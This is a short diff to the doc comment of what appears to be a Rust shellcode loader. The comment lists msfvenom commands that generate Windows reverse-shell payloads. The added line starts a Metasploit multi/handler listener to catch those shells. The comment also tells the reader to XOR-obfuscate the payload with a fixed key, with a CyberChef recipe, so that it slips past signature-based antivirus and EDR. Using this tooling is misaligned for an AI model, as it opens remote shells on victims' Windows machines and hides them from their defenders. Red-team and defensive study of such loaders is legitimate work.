@@ -23,6 +23,7 @@ type LPVOID = *mut c_void;
 ///
 /// msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f num LHOST=<IP> LPORT=<PORT>
 /// msfvenom -p windows/shell_reverse_tcp -a x86 -f num LHOST=<IP> LPORT=<PORT>
+/// msfconsole -x "use exploit/multi/handler; set LHOST <IP>; set LPORT <PORT>; set ExitOnSession false; run -j"
 ///
 /// Obfuscate it with static xor key for signature based EDR/AV (example key: 0xC 0x3 0xFA 0x8 0x3)
 /// <https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR(%7B'option':'Hex','string':'0xC0x30xFA0x80x3'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)Find_/_Replace(%7B'option':'Simple%20string','string':','%7D,',%20',true,false,true,false)&oeol=FF>
